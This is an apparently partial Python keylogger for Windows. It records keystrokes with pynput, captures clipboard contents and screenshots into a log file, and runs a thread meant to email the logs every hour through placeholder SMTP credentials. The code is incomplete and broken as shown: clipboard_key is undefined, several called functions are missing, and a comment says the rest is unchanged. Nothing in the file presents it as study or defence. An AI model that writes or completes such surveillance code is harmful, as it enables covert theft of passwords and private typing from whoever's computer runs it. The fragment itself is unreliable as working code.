from pynput import keyboard, mouse
import time
import threading
import subprocess
from PIL import ImageGrab
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import os
import win32clipboard

log_file = 'keystrokes_log.txt'
screenshot_folder = 'screenshots/'
email_interval = 3600  # Send email every 1 hour

current_word = ""
current_line = ""
current_application = ""
screenshot_key = keyboard.Key.print_screen

# Email configuration
smtp_server = 'your_smtp_server'
smtp_port = 587
sender_email = 'your_sender_email'
sender_password = 'your_sender_password'
recipient_email = 'recipient_email'

def on_key_press(key):
    global current_word, current_line, current_application

    try:
        if key == screenshot_key:
            capture_screenshot()
        elif key == clipboard_key:
            capture_clipboard()
        elif hasattr(key, 'char'):
            current_word += key.char
        elif key == keyboard.Key.space:
            current_word += " "
        elif key == keyboard.Key.enter:
            current_word += "\n"
            current_line += current_word
            current_word = ""
    except AttributeError:
        if key == keyboard.Key.space:
            if current_word:
                current_line += current_word + " "
                current_word = ""
        elif key == keyboard.Key.enter:
            if current_word:
                current_line += current_word + "\n"
                current_word = ""
    
    if len(current_line) >= 50:
        save_current_line()

def capture_clipboard():
    try:
        win32clipboard.OpenClipboard()
        clipboard_text = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        if clipboard_text:
            with open(log_file, 'a') as f:
                f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")} - Clipboard: {clipboard_text}\n')
    except Exception as e:
        print("Error capturing clipboard:", e)

# Rest of the code remains unchanged

def main():
    global current_application
    current_application = get_active_application()
    
    email_thread = threading.Thread(target=send_email)
    email_thread.daemon = True
    email_thread.start()
    
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == '__main__':
    main()
